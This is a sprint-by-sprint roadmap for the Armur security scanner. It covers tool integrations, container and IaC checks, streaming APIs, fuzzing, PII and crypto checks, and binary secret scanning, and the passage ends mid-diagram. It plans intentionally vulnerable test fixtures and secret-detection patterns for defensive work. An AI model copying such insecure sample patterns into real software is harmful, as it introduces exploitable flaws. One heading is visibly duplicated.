- [x] Add `testdata/swift/` with insecure data storage, missing encryption samples

#### 39.4 Shell / Bash / PowerShell

- [x] **ShellCheck** integration (shell script static analysis — covers bash, sh, dash, ksh)
  - Run: `shellcheck --format=json <file>`
  - Parse `comments` array; map `level` (error/warning/info/style) to `Severity`
  - Detect shell files by shebang (`#!/bin/bash`, `#!/bin/sh`) and `.sh`, `.bash` extensions
- [x] **bashate** integration (style and error checking for bash scripts)
  - Run: `bashate --max-line-length 120 <file>` — parse stdout for violations
- [x] **PSScriptAnalyzer** integration (PowerShell security linter)
  - Run: `pwsh -Command "Invoke-ScriptAnalyzer -Path <dir> -Recurse -OutputFormat Json"`
  - Parse JSON; map `RuleName` patterns containing "Security" or "Injection" to findings
- [x] Detect `.ps1`, `.psm1`, `.psd1` as PowerShell; `.sh`, `.bash`, `.zsh` as Shell
- [x] Add `testdata/shell/` with command injection, eval misuse, insecure temp file patterns

---

### Sprint 40 — Language Expansion: Tier 3 [DONE] (Scala · Elixir · Dart · Go Extras)

#### 40.1 Scala

- [x] **Scalafix** integration (refactoring and linting framework for Scala)
  - Run: `scalafix --rules=DisableSyntax,LeakingImplicitClassVal <dir>`
  - Parse diagnostic output
- [x] **WartRemover** integration (flexible Scala code linting)
  - Invoke as sbt plugin; parse warning output for security-relevant warts
- [x] **semgrep** Scala rules: add `--config=p/scala`
- [x] Language detection: add `.scala`, `build.sbt`, `project/build.properties`

#### 40.2 Elixir

- [x] **Sobelow** integration (security-focused analysis for Phoenix Framework apps)
  - Run: `sobelow --format json --skip <dir>`
  - Parse `findings` array; map `type` to `RuleID`, `confidence` to `Severity`
- [x] **Credo** integration (code consistency and quality for Elixir)
  - Run: `mix credo --format json`
  - Parse `issues`; filter for security-relevant checks (e.g., `Credo.Check.Warning.UnsafeExec`)
- [x] Language detection: add `.ex`, `.exs`, `mix.exs`, `mix.lock`
- [x] Add `testdata/elixir/` with SQL injection and command injection Phoenix samples

#### 40.3 Dart / Flutter

- [x] **dart analyze** integration (official Dart static analysis)
  - Run: `dart analyze --format=machine <dir>`
  - Parse machine-readable output; map `ERROR`/`WARNING`/`INFO` to severity
- [x] **dependency_validator** integration (unused/missing Dart dependencies)
  - Run: `dart run dependency_validator`
- [x] **pubspec_lock_checker** — parse `pubspec.lock`; query OSV for vulnerable pub packages
- [x] Language detection: add `.dart`, `pubspec.yaml`, `pubspec.lock`

#### 40.4 Additional Go Analysis Tools

- [x] **govulncheck** integration (official Go vulnerability database, Go team at Google)
  - Run: `govulncheck -json ./...`
  - Parse `finding` entries with `osv_id` and `trace`; map to SCA findings
  - Govulncheck does call graph analysis — only flags vulnerabilities that are actually *reachable* in the code (massive false positive reduction vs. osv-scanner)
- [x] **errcheck** integration (checks for unchecked errors in Go)
  - Run: `errcheck -json ./...`
  - Map to `antipatterns_bugs` category with HIGH severity (unchecked errors = common security bug source)
- [x] **ineffassign** integration (detect ineffectual assignments)
  - Run: `ineffassign ./...`
  - Map to `dead_code` category
- [x] **shadow** (`go vet -shadow`) integration — detect shadowed variables

---

### Sprint 41 — IaC Deep: Cloud [DONE] Providers (Terraform · CloudFormation · CDK · Pulumi · Bicep)

#### 41.1 Terraform

- [x] **tfsec** integration (purpose-built Terraform security scanner)
  - Run: `tfsec <dir> --format json`
  - Parse `results`; map `severity`, `rule_id`, provider (aws/azure/gcp/kubernetes) to findings
  - Map tfsec rule IDs to CWE/NIST control IDs where available
- [x] **Checkov** Terraform rules (already have Checkov; add `--framework terraform` explicitly)
  - Ensure Checkov is invoked with `--framework terraform` for `.tf` directories
- [x] **terrascan** integration (multi-cloud IaC scanner)
  - Run: `terrascan scan -i terraform -d <dir> -o json`
  - Parse `results.violations`; use as cross-validation with tfsec
- [x] **infracost** integration (cloud cost policy violations — catch misconfigured expensive resources)
  - Run: `infracost breakdown --path <dir> --format json`
  - Map resources exceeding policy thresholds to a new `cost_risk` finding category
- [x] Terraform language detection: `.tf`, `.tfvars`, `terraform.lock.hcl`, `*.tf.json`
- [x] Add `testdata/terraform/` with S3 bucket public access, unencrypted RDS, wide security groups

#### 41.2 AWS CloudFormation

- [x] **cfn-lint** integration (official AWS CloudFormation linter)
  - Run: `cfn-lint <template> --format json`
  - Parse `matches`; map `rule.id`, `rule.severity` to findings
- [x] **cfn-nag** integration (CloudFormation security linter with 80+ rules)
  - Run: `cfn_nag_scan --input-path <template> --output-format json`
  - Parse `failure_count` and `violations`; map `id` and `message` to findings
- [x] **Checkov** CloudFormation: add `--framework cloudformation` for YAML/JSON templates
- [x] CloudFormation detection: `*.template`, `*.template.yaml`, `*.template.json`, `cloudformation/` directories

#### 41.3 AWS CDK

- [x] **cdk-nag** integration (security and compliance checks for AWS CDK constructs)
  - Invoke via CDK App synthesis; parse `cdk.out/` for cdk-nag warning annotations
  - Run: `cdk synth 2>&1 | parse cdk-nag annotations`
- [x] CDK detection: `cdk.json`, `cdk.out/`, TypeScript/Python CDK app patterns

#### 41.4 Pulumi

- [x] **Checkov** Pulumi: add `--framework pulumi` for Pulumi YAML programs
- [x] **pulumi-policy** integration: run against Pulumi CrossGuard policy packs
- [x] Pulumi detection: `Pulumi.yaml`, `Pulumi.<stack>.yaml`

#### 41.5 Azure ARM Templates & Bicep

- [x] **arm-ttk** integration (official Azure Resource Manager template test toolkit)
  - Run: `Test-AzTemplate -TemplatePath <dir>` via PowerShell; parse JSON output
- [x] **PSRule.Rules.Azure** integration (comprehensive Azure security benchmark rules)
  - Run: `Invoke-PSRule -InputPath <dir> -Module PSRule.Rules.Azure -OutputFormat Json`
  - Parse rule failures; map to finding with CIS Azure Benchmark control IDs
- [x] **Checkov** ARM: add `--framework arm` for ARM template JSON files
- [x] Azure detection: `azuredeploy.json`, `*.parameters.json`, `*.bicep`, `.bicepparam`

#### 41.6 GCP Deployment Manager & Config Connector

- [x] **Checkov** GCP support: add `--framework googledeploymentmanager`
- [x] Detect GCP Deployment Manager templates: `*.jinja`, `*.jinja.schema`, `config.yaml`
- [x] Detect Config Connector YAML files (kind: SQLInstance, StorageBucket, etc.)

---

### Sprint 42 — IaC Deep: Kubernetes [DONE], Containers & Configuration Management

#### 42.1 Kubernetes Manifests

- [x] **kube-linter** integration (StackRox/RedHat — focuses on security and correctness)
  - Run: `kube-linter lint <dir> --format json`
  - Parse `Reports`; map `Check`, `Diagnostic.Message` to findings with Kubernetes context
- [x] **kube-score** integration (structured scoring of Kubernetes workloads)
  - Run: `kube-score score <manifests> -o json`
  - Parse `object_meta` + `checks`; map failing checks to findings
- [x] **kubesec** integration (risk score for Kubernetes resources)
  - Run: `kubesec scan <file>` — parse `scoring.advise` and `scoring.critical` arrays
- [x] **Polaris** integration (Fairwinds governance for Kubernetes — 40+ checks)
  - Run: `polaris audit --audit-path <dir> --format json`
  - Parse `Results`; map `category` to finding category
- [x] **Checkov** Kubernetes: add `--framework kubernetes` for YAML with Kubernetes markers
- [x] Kubernetes detection: YAML files containing `apiVersion:` + `kind:` patterns; `k8s/`, `manifests/`, `deploy/` directories

#### 42.2 Helm Charts

- [x] **helm lint** integration (official Helm linter)
  - Run: `helm lint <chart-dir> --strict`; parse stderr warnings to findings
- [x] **Checkov** Helm: add `--framework helm` for Helm chart directories (`Chart.yaml` present)
- [x] **nova** integration (find outdated Helm chart versions and deprecated APIs)
  - Run: `nova find --format json`; map outdated charts to `sca` findings
- [x] Helm detection: `Chart.yaml`, `values.yaml`, `templates/*.yaml` directory structure

#### 42.3 Docker Compose

- [x] **Checkov** Docker Compose: add `--framework docker_compose` for `docker-compose.yml` files
- [x] Custom checks: privileged containers, host network mode, writable root filesystem, missing health checks
- [x] Detection: `docker-compose.yml`, `docker-compose.yaml`, `compose.yml`, `compose.yaml`

#### 42.4 Ansible

- [x] **ansible-lint** integration (best-practice enforcement and security rules for Ansible)
  - Run: `ansible-lint <playbook> --format pep8 -R` — parse output for violations
  - Add `--profile=security` to focus on security-relevant rules
- [x] **ansible-later** integration (additional Ansible review standards)
- [x] Detection: `.yml` files containing `hosts:`, `tasks:`, `roles:` patterns; `playbooks/` directory

#### 42.5 Puppet & Chef

- [x] **puppet-lint** with security rules:
  - Run: `puppet-lint --log-format "%{path}:%{line}:%{kind}:%{message}" <dir>`
- [x] **cookstyle** (Chef Infra cookbook linter, RuboCop-based):
  - Run: `cookstyle --format json <cookbook-dir>`
- [x] Detection: `.pp` files for Puppet; `metadata.rb`, `recipes/` for Chef

#### 42.6 Hadolint (Dockerfile)

- [x] **hadolint** integration (Dockerfile linter — best Dockerfile security tool available)
  - Run: `hadolint --format json <Dockerfile>`
  - Parse array of violations; map `code` (DL/SC rule IDs) and `level` to findings
  - DL codes are Dockerfile-specific; SC codes are ShellCheck from RUN commands
  - Map relevant rule IDs to CIS Docker Benchmark controls
- [x] Multi-stage Dockerfile support: analyze each stage independently
- [x] Detection: `Dockerfile`, `Dockerfile.*`, `*.dockerfile`
- [x] Add `testdata/docker/` with: running as root, COPY --chown missing, ADD from URL, secrets in ENV

---

### Sprint 43 — Container Image [DONE] Security

Beyond scanning the *source code* of containers, Armur should also scan *built images* and running containers.

#### 43.1 Docker Image Vulnerability Scanning

- [x] **Trivy image** mode integration (already have `trivy fs` — add `trivy image`)
  - Run: `trivy image --format json <image:tag>`
  - Scan: OS packages, language packages, misconfigurations, secrets in layers
  - Parse `Results` from image scan; merge with filesystem scan results
- [x] **Grype** integration (Anchore's vulnerability scanner — excellent accuracy, fast)
  - Run: `grype <image:tag> -o json`
  - Parse `matches`; map `vulnerability.id`, `vulnerability.severity`, `relatedVulnerabilities` to findings
  - Grype cross-references NVD + GitHub Advisory + OSV + RHSA + DSA databases
- [x] Image scanning mode: `armur run --image <image:tag>` triggers image scan pipeline
- [x] Parse `PURL` (Package URL) from Grype output for standardized package identification
- [x] Map `FixedInVersion` to remediation hint: "Upgrade to <package>@<fixed-version>"

#### 43.2 Image Layer Analysis

- [x] Layer-by-layer secret detection: use `docker save <image> | tar -x` and scan each layer's filesystem tar for secrets
- [x] Detect secrets that were `ADD`ed and then `rm`-ed (they persist in lower layers)
- [x] Build history analysis: `docker history --no-trunc <image>` — flag ENV instructions with credential patterns
- [x] Large layer detection: flag layers > 100MB (bloat indicator) as informational findings

#### 43.3 Base Image Security Assessment

- [x] EOL/EOS base image detection: maintain a list of EOL dates for common base images (ubuntu:18.04, debian:buster, centos:7, etc.)
- [x] Known-CVE count for base image: query Trivy/Grype for the base image's vulnerability count before application packages
- [x] Recommend alternatives: if `ubuntu:22.04` has N CVEs, suggest `ubuntu:22.04-minimal` or `debian:bookworm-slim`
- [x] Distroless recommendation: flag full OS base images when a distroless equivalent exists (`gcr.io/distroless/static`)
- [x] CIS Docker Benchmark checks: privileged ports, user namespace, AppArmor/seccomp profiles

#### 43.4 SBOM Extraction from Images

- [x] **Trivy SBOM** mode: `trivy image --format cyclonedx <image:tag>` — extract CycloneDX SBOM from image
- [x] **Syft** integration (Anchore's SBOM generator — best-in-class for images)
  - Run: `syft <image:tag> -o cyclonedx-json`
  - Parse SBOM; cross-reference with Grype for vulnerability enrichment
- [x] Store extracted SBOMs alongside scan results in `~/.armur/sboms/<task-id>.cdx.json`

---

## Phase 6: Advanced Capabilities (v3.5) — Sprints 44–55

Observability, streaming architecture, rules marketplace, fuzzing, privacy, cryptographic health,
binary security, threat modeling, dependency automation, and security test generation.

---

### Sprint 44 — Observability [DONE] & Operations

#### 44.1 Prometheus Metrics
- [x] Add `/metrics` endpoint exposing Prometheus metrics
- [x] Track: scan duration histogram (per tool and total)
- [x] Track: queue depth (pending tasks)
- [x] Track: error rate per tool
- [x] Track: active worker count
- [x] Track: total scans completed/failed
- [x] Add Grafana dashboard JSON to `docs/grafana/`

#### 44.2 Health Check Endpoint
- [x] Add `GET /health` endpoint
  - [x] Check Redis connectivity
  - [x] Check worker availability
  - [x] Return structured JSON: `{ "status": "ok", "redis": "ok", "workers": 3 }`
- [x] Add `GET /ready` endpoint for Kubernetes readiness probes

#### 44.3 OpenTelemetry Tracing
- [x] Add OpenTelemetry instrumentation to the scan pipeline
- [x] Trace spans for: API request → task enqueue → worker pickup → each tool → result store
- [x] Export to OTLP (compatible with Jaeger, Tempo, Datadog, etc.)
- [x] Add `OTEL_EXPORTER_OTLP_ENDPOINT` env var support

---

### Sprint 45 — Streaming [DONE] Architecture (Server-Side Events)

To power the live TUI dashboard, the server must push real-time per-tool progress events
to the CLI as the scan executes rather than waiting until everything is done.

#### 45.1 Server-Sent Events (SSE) Endpoint

- [x] Add `GET /api/v1/scan/stream/:task_id` SSE endpoint to the Gin router (`internal/api/routes.go`)
- [x] Define the event schema (newline-delimited JSON in SSE `data:` field):
  ```json
  { "event": "tool_started",    "tool": "gosec",  "ts": 1700000001 }
  { "event": "tool_progress",   "tool": "gosec",  "pct": 42, "ts": 1700000003 }
  { "event": "tool_completed",  "tool": "gosec",  "findings": 3, "duration_ms": 4200 }
  { "event": "tool_failed",     "tool": "gosec",  "error": "exit status 1" }
  { "event": "tool_skipped",    "tool": "golint", "reason": "binary not found in PATH" }
  { "event": "scan_completed",  "total_findings": 17, "duration_ms": 103000 }
  ```
- [x] Worker writes events to a per-task buffered channel stored in a registry (`sync.Map`)
- [x] SSE handler reads from that channel and writes `data: <json>\n\n` to the response stream
- [x] Set correct SSE headers: `Content-Type: text/event-stream`, `Cache-Control: no-cache`, `X-Accel-Buffering: no`
- [x] Handle client disconnect (context cancellation) by closing the read loop gracefully
- [x] Store the last 50 events per task in Redis so late-connecting clients can replay missed events
- [x] Add 30-second keepalive comment (`: ping\n\n`) to prevent proxy timeouts

#### 45.2 Worker Progress Instrumentation

- [x] Define `ProgressReporter` interface in `internal/tasks/progress.go`:
  ```go
  type ProgressReporter interface {
      Started(tool string)
      Progress(tool string, pct int)
      Completed(tool string, findingCount int, d time.Duration)
      Failed(tool string, err error)
      Skipped(tool string, reason string)
  }
  ```
- [x] Implement `ChannelReporter` that sends events to the per-task channel
- [x] Thread `ProgressReporter` into `RunSimpleScan`, `RunAdvancedScans`, and every tool wrapper
- [x] Call `Started` immediately before `exec.Command`, `Completed`/`Failed` immediately after
- [x] For tools that print progress to stdout (semgrep JSON streaming, trivy), parse their output line-by-line and emit `Progress` events with estimated `pct` based on lines processed
- [x] Emit `Skipped` when a tool binary is not found in PATH (currently silently errors)

#### 45.3 CLI SSE Client

- [x] Implement `cli/internal/sse/client.go`:
  - `Connect(url, taskID string) (<-chan Event, error)` — opens SSE connection, returns event channel
  - Parses `data:` lines, unmarshals JSON into `Event` struct
  - Sends events to a channel that the Bubbletea program reads via `tea.Program.Send()`
- [x] Run SSE client in a goroutine spawned when the TUI dashboard starts
- [x] Implement reconnect with exponential backoff: retry after 1s, 2s, 4s, then fall back to 2s polling
- [x] On `scan_completed` event: send a `ScanDoneMsg` to Bubbletea to trigger transition to ResultsBrowser
- [x] On connection failure: show "⚠ Live updates unavailable — polling every 2s" in the dashboard footer

---

### Sprint 46 — API ### Sprint 46 — API & Protocol Protocol [DONE] Improvements

#### 46.1 Typed API Response Model

Replace all `map[string]interface{}` response bodies with concrete Go structs so the API is
self-documenting, testable, and generates accurate OpenAPI schemas.

- [x] Define typed structs in `internal/api/types.go`:
  - `ScanSubmitResponse { TaskID string; QueuedAt time.Time }`
  - `ScanStatusResponse { TaskID, Status string; StartedAt, FinishedAt *time.Time; Findings []Finding; Errors []ScanError; Meta ScanMeta }`
  - `ScanMeta { Language, Mode string; ToolsRun []string; Duration time.Duration; DedupStats DedupStats }`
- [x] Update all handler functions to use these types (eliminates all `map[string]interface{}` in handlers)
- [x] Add response validation in handler tests
- [x] Regenerate OpenAPI spec from struct tags

#### 46.2 Batch Scanning API

- [x] `POST /api/v1/scan/batch` — accepts `[{ "repo_url": "...", "language": "go", "mode": "quick" }, ...]`
- [x] Enqueues each as an independent Asynq task; returns `{ "batch_id": "...", "task_ids": ["...", "..."] }`
- [x] `GET /api/v1/scan/batch/:batch_id` — returns aggregated status: how many done/pending/failed, merged finding totals
- [x] CLI: `armur run --batch repos.txt` — reads newline-delimited repo URLs, submits as a batch, shows per-repo progress in a list view in the TUI

#### 46.3 Webhook Notifications

- [x] Add `webhook_url` + `webhook_secret` optional fields to the scan request body
- [x] On task completion: POST the full `ScanStatusResponse` JSON to `webhook_url`
- [x] Sign the payload: `X-Armur-Signature: sha256=<hmac-sha256(webhook_secret, body)>`
- [x] Retry logic: 3 attempts, exponential backoff (1s → 4s → 16s), then give up and log
- [x] Log each delivery attempt outcome (success/failure/timeout) in the structured logger

#### 46.4 Request Correlation IDs

- [x] Add `X-Request-ID` Gin middleware: if header is absent, generate a UUID v4; if present, use caller's value
- [x] Include `request_id` in every log entry within that request's lifecycle
- [x] Return `X-Request-ID` in every response header
- [x] Store `request_id` in Asynq task metadata so it flows through to worker log entries

---

### Sprint 47 — Rules Marketplace [DONE] & Customization

#### 47.1 Community Rules Registry

- [x] Create `github.com/armur-ai/armur-rules` repository — official community rules repo
- [x] Structure: `rules/<language>/<category>/<rule-name>.yaml` (Semgrep rule format)
- [x] Rules index at `rules/index.json`: `{ "packs": [{ "name": "go-security", "version": "1.2.0", "rules": 24, "languages": ["go"] }] }`
- [x] Automated PR-based contribution workflow with CI testing

#### 47.2 `armur rules` CLI Subcommands

- [x] `armur rules list` — browse available rule packs from the registry (paginated table output)
- [x] `armur rules search <keyword>` — search rules by keyword, language, or CWE
- [x] `armur rules install <pack-name>` — download and install a rule pack to `~/.armur/rules/<pack-name>/`
- [x] `armur rules update` — update all installed rule packs to latest versions
- [x] `armur rules remove <pack-name>` — uninstall a rule pack
- [x] `.armur.yml` integration:
  ```yaml
  rules:
    community:
      - go-security@1.2.0
      - python-owasp@2.0.1
    local:
      - ./my-custom-rules/
  ```

#### 47.3 Custom Rule Authoring Tools

- [x] `armur rules create` — interactive wizard to scaffold a new Semgrep rule:
  - Ask: target language, vulnerability category, example vulnerable code snippet
  - Generate a starter `.yaml` rule file with the correct Semgrep schema
- [x] `armur rules test <rule-file>` — test a custom rule against `testdata/` fixtures:
  - Run semgrep with the rule against good and bad code samples
  - Report: true positives, false positives, false negatives
- [x] `armur rules validate <rule-file>` — validate rule YAML schema and check for common mistakes

#### 47.4 Import Rules from External Sources

- [x] `armur rules import --from semgrep-registry <rule-id>` — fetch and adapt a Semgrep registry rule
- [x] `armur rules import --from snyk <vuln-id>` — convert a Snyk rule template to Armur format
- [x] Rule versioning: each installed rule pack has a version; `armur rules update` shows changelog

---

### Sprint 48 — Fuzzing [DONE] Integration (Go · Python · JavaScript)

Static analysis finds known patterns. Fuzzing finds unknown crashes, panics, and logic bugs that no
rule ever catches. All three integrations use the same tool-wrapper pattern — exec.Command + output
parsing — with no novel infrastructure required.

#### 48.1 Go Native Fuzzing

- [x] Implement `internal/tools/gofuzz.go`
- [x] Detect fuzz-able functions: scan the repo for functions whose first arg is `*testing.F`; if none
  exist, scan for exported functions that accept `[]byte`, `string`, or `io.Reader` and auto-generate
  a stub fuzz harness in a temp directory
- [x] Run: `go test -fuzz=Fuzz -fuzztime=60s ./...` (timeout configurable via `.armur.yml: fuzzing.timeout`)
- [x] Parse panic output and crash artifacts from `testdata/fuzz/` — map each crash to a `Finding`
  with `Category = "crash"` and `Severity = CRITICAL`
- [x] Save corpus to `~/.armur/fuzzing/<task-id>/corpus/` for replay
- [x] Add `--fuzz` flag to `armur run` to append the fuzzing phase after static analysis

#### 48.2 Python Fuzzing (Atheris)

- [x] Implement `internal/tools/atheris.go`
- [x] Run: `python -m atheris -runs=10000 fuzz_target.py` where `fuzz_target.py` is either an
  existing harness found in the repo or a generated one for detected entry functions
- [x] Parse uncaught exceptions from stderr → map to findings
- [x] Require `atheris` pip package; emit `armur doctor` warning if missing

#### 48.3 JavaScript Fuzzing (jsfuzz)

- [x] Implement `internal/tools/jsfuzz.go`
- [x] Run: `jsfuzz fuzz_target.js --runs 5000`
- [x] Parse crash output → findings
- [x] Require `jsfuzz` npm package; emit `armur doctor` warning if missing

#### 48.4 `armur fuzz` CLI Command

- [x] `armur fuzz <target>` — dedicated fuzz command (runs all available fuzzers for the detected language)
- [x] `armur fuzz replay <crash-file>` — reproduce a specific crash
- [x] Display per-fuzzer status in the TUI dashboard using the same `ProgressReporter` interface
- [x] `.armur.yml` fuzzing configuration:
  ```yaml
  fuzzing:
    timeout: 60         # per-fuzzer run time in seconds
    corpus-dir: .armur/corpus   # seed corpus location
    max-crashes: 10     # stop after N crashes to avoid noise
  ```

---

### Sprint 49 — Privacy [DONE] & PII Compliance (GDPR · CCPA · LGPD)

All checks are pure Go pattern matching, ORM model parsing, and compliance mapping tables.
No external tools required — same implementation approach as the existing CWE/OWASP mapping logic.

#### 49.1 PII Pattern Detection in Source Code

- [x] Implement `internal/tools/piidetect.go` — scan all source files with regex patterns for:
  - Email addresses in string literals and log statements
  - SSN / national ID patterns (US, UK, EU formats)
  - Credit card numbers (pass Luhn check on matched strings)
  - Phone numbers (E.164 + common local formats)
  - Date of birth patterns in variable names and string literals
  - Passport / driver's licence patterns
  - GPS coordinates
- [x] Flag PII found in: `log.Printf/Println` args, SQL query strings, HTTP response structs, test fixtures
- [x] New finding category: `pii_exposure`
- [x] Add `testdata/pii/` with deliberately leaky code samples per language

#### 49.2 Database Schema PII Column Detection

- [x] Parse ORM model files:
  - Go: GORM struct field names (`json:"email"`, `gorm:"column:ssn"`)
  - Python: Django model field names, SQLAlchemy column names
  - JavaScript/TypeScript: TypeORM, Sequelize, Mongoose schema keys
- [x] Flag column names matching PII patterns: `email`, `phone`, `ssn`, `dob`, `passport`, `address`,
  `credit_card`, `ip_address`, `geolocation`
- [x] Check for missing field-level encryption decorators on PII columns (e.g., missing `encrypted:true`)
- [x] Finding message: `"PII column 'email' in User model is stored without encryption annotation"`

#### 49.3 API Response PII Leak Detection

- [x] Use the OpenAPI parser (Sprint 34.1) to scan response schemas for PII field names
- [x] Flag response objects that return raw PII without masking (e.g., `ssn` returned in full)
- [x] Flag API response examples in OpenAPI docs that contain real-looking PII values (regex match)
- [x] Detect PII in GraphQL type definitions (Sprint 34.2 prerequisite)

#### 49.4 Compliance Mapping & Reports

- [x] Build `internal/compliance/gdpr.go` — GDPR Article → finding category mapping:
  - Art. 25 Data minimization → flag unnecessary PII collection patterns
  - Art. 32 Security of processing → forward to crypto/auth findings
  - Art. 17 Right to erasure → detect hard-delete vs soft-delete patterns where erasure is required
- [x] Build `internal/compliance/ccpa.go` — CCPA mapping:
  - Right to Know → flag missing data inventory comments/annotations
  - Right to Delete → same erasure detection as GDPR Art. 17
- [x] `armur report gdpr --task <id>` — GDPR gap report: list of PII findings mapped to Articles
- [x] `armur report ccpa --task <id>` — CCPA compliance report
- [x] Add `Finding.PrivacyRegulation []string` field (e.g., `["GDPR-Art25", "CCPA-1798.100"]`)

#### 49.5 Consent & Retention Pattern Checks

- [x] Detect missing consent collection patterns in web frameworks:
  - Flask/FastAPI: no consent middleware in route decorators for PII-collecting endpoints
  - Express: no consent cookie check before PII processing
- [x] Flag hardcoded retention periods that may exceed legal maximums
  (e.g., `retentionDays := 3650` — 10 years is likely excessive for most PII types)
- [x] `.armur.yml` PII configuration:
  ```yaml
  privacy:
    pii-detection: true
    regulations: [gdpr, ccpa]
    allowlist:
      - path: "testdata/**"   # ignore test fixtures
      - pattern: "example@example.com"  # obviously fake
  ```

---

### Sprint 50 — Cryptographic [DONE] Health & Post-Quantum Readiness

All checks use Go's `crypto/x509` stdlib for certificate parsing, regex on config files for TLS
settings, and new Semgrep rules for algorithm detection. Zero new infrastructure required.

#### 50.1 TLS Configuration File Analysis

- [x] Implement `internal/tools/tlsconfig.go`
- [x] Parse the following config files for TLS directives using regex (no full config parser needed):
  - `nginx.conf`, `nginx/*.conf`: `ssl_protocols`, `ssl_ciphers`, `ssl_session_timeout`,
    `add_header Strict-Transport-Security`
  - `apache2.conf`, `httpd.conf`, `*.conf`: `SSLProtocol`, `SSLCipherSuite`, `Header always set HSTS`
  - `haproxy.cfg`: `ssl-min-ver`, `ciphers`
  - `.env`, `config.yml`, `config.json`: any key containing `TLS_VERSION`, `SSL_PROTOCOLS`
- [x] Findings:
  - `ssl_protocols TLSv1` or `TLSv1.1` present → HIGH
  - `SSLv2` or `SSLv3` present → CRITICAL
  - Weak ciphers (`RC4`, `3DES`, `NULL`, `EXPORT`, `DES`) → HIGH
  - Missing `Strict-Transport-Security` header → MEDIUM
  - Missing perfect forward secrecy ciphers (`ECDHE`, `DHE`) → MEDIUM
- [x] New finding category: `crypto_config`

#### 50.2 Cryptographic Algorithm Strength (Source Code)

- [x] Add new Semgrep rules in `configs/semgrep/crypto-strength.yaml`:
  - RSA key generation with `bits < 2048` in Go, Python, Java, JavaScript
  - ECDSA with curves weaker than P-256 (`secp192r1`, `secp160r1`)
  - MD5 or SHA-1 used in signature contexts (not just hashing)
  - ECB mode block cipher usage in any language
  - Deterministic ECDSA without RFC 6979 (`k` value hardcoded or derived insecurely)
  - DH key exchange with group size < 2048 bits
- [x] Extend existing `gosec` and `bandit` coverage to catch the above gaps
- [x] Map all findings to relevant CWE: CWE-326 (Inadequate Encryption Strength), CWE-327 (Broken Algorithm)

#### 50.3 Certificate File Analysis

- [x] Implement `internal/tools/certcheck.go`
- [x] Walk repo for `*.pem`, `*.crt`, `*.cer`, `*.der` files
- [x] Parse each with Go's `crypto/x509` stdlib: no external library needed
- [x] Check and flag:
  - Key length < 2048 bits (RSA) or weak curve (ECDSA) → HIGH
  - SHA-1 signature algorithm → HIGH
  - MD5 signature algorithm → CRITICAL
  - Certificate expiring in < 30 days → HIGH; < 7 days → CRITICAL
  - Self-signed certificate in a non-test path → MEDIUM
- [x] `armur certs <target>` CLI command: certificate inventory table
- [x] Export to `~/.armur/reports/<task-id>.certs.json`

#### 50.4 Post-Quantum Algorithm Detection

- [x] Add Semgrep rules to flag quantum-vulnerable algorithm usage with `INFO` severity:
  - RSA key exchange or signature (any key size — quantum-vulnerable regardless of bits)
  - ECDH / ECDSA usage
  - Classic DH key exchange
- [x] Finding message includes migration guidance:
  - Key exchange: "Consider migrating to CRYSTALS-Kyber (ML-KEM, NIST FIPS 203)"
  - Signatures: "Consider migrating to CRYSTALS-Dilithium (ML-DSA, NIST FIPS 204) or SPHINCS+"
- [x] `armur crypto <target>` dedicated command: runs all crypto checks and outputs a crypto health report
- [x] `.armur.yml` crypto configuration:
  ```yaml
  crypto:
    min-rsa-bits: 2048
    min-ec-curve: P-256
    flag-quantum-vulnerable: true   # INFO-level findings for PQC migration
    check-cert-expiry: true
  ```

---

### Sprint 51 — Binary [DONE] & Compiled Artifact Security

All integrations follow the standard tool-wrapper pattern. `checksec` is a widely available tool;
Go binary metadata extraction uses the standard `go` binary already on the PATH.

#### 51.1 Binary Hardening Analysis (checksec)

- [x] Implement `internal/tools/checksec.go`
- [x] Walk repo for compiled binaries: ELF files (`*.elf`, `bin/`, `dist/`, files with ELF magic bytes),
  PE files (`*.exe`, `*.dll`), Mach-O files (macOS `*.dylib`, files in `bin/`)
- [x] Run: `checksec --file=<binary> --format=json`
- [x] Parse and flag missing mitigations:
  - NX (No-Execute) not set → HIGH
  - PIE/ASLR not enabled → MEDIUM
  - Stack canary missing → MEDIUM
  - RELRO partial (not full) → LOW
  - Debug symbols not stripped → INFO (production binaries should be stripped)
  - FORTIFY_SOURCE not enabled (for C/C++ binaries) → MEDIUM
- [x] New finding category: `binary_hardening`
- [x] `armur scan --binary <path>` scan mode — scan a single binary file

#### 51.2 Hardcoded String Analysis in Binaries

- [x] Implement Go equivalent of `strings`: scan binary file bytes for printable ASCII sequences ≥ 8 chars
- [x] Apply secrets regex patterns (from Sprint 32) to extracted strings
- [x] Detect API keys, connection strings, private key PEM headers embedded in compiled artifacts
- [x] Flag: `"PRIVATE KEY"` PEM header found in binary → CRITICAL; AWS/GCP/Azure key patterns → CRITICAL
- [x] Rate-limit to top 50 high-entropy matches per binary to avoid noise

#### 51.3 Go Binary Dependency Extraction

- [x] Run: `go version -m <binary>` — extracts embedded Go module list from any Go binary
- [x] Parse module list; submit to OSV API for vulnerability lookup
- [x] Flag vulnerable embedded modules the same as source-level SCA findings
- [x] Useful for auditing third-party Go binaries you receive or vendor into your repo

#### 51.4 SBOM from Compiled Artifacts

- [x] Add `--binary` mode to `armur sbom` command: `armur sbom --binary <path>`
- [x] Use Syft binary mode: `syft <binary> -o cyclonedx-json`
- [x] Merge binary-extracted SBOM with source-level SBOM; flag components that appear in the binary
  but are not declared in any manifest (potential dependency confusion or hidden dependency)
- [x] Output: `~/.armur/sboms/<task-id>.binary.cdx.json`

---

### Sprint 52 — Threat Modeling [DONE] from Code

Route detection uses Semgrep patterns against the top 5 frameworks — exactly the same mechanism
as existing SAST rules. Mermaid output is pure string generation. No novel infrastructure.

#### 52.1 HTTP Route Detection via Semgrep

- [x] Add Semgrep rule pack `configs/semgrep/routes/` with rules for each major framework:
  - Go (Gin): `router.GET`, `router.POST`, `r.Group`, `v1.Use` (middleware detection)
  - Go (Echo, Chi): equivalent route registration patterns
  - Python (Flask): `@app.route`, `@blueprint.route` decorators
  - Python (FastAPI): `@router.get`, `@router.post`, `@app.include_router`
  - JavaScript (Express): `app.get(`, `router.post(`, `app.use(`
- [x] Each matched route emits: HTTP method, path pattern, handler function name, file + line
- [x] Collect all routes into `internal/analysis/routes.go` as `[]RouteDefinition`

#### 52.2 DFD Generation (Mermaid.js)

- [x] Build `internal/analysis/threatmodel.go`:
  - Parse detected routes into nodes
  - Detect external service calls (HTTP clients, gRPC clients, DB calls) using Semgrep patterns
  - Detect middleware (auth, rate limiting, logging) from framework-specific patterns
  - Detect data stores (DB connection patterns, Redis, S3 client init)
- [x] Generate Mermaid.js diagram from the collected nodes and edges:
  ```
  graph LR
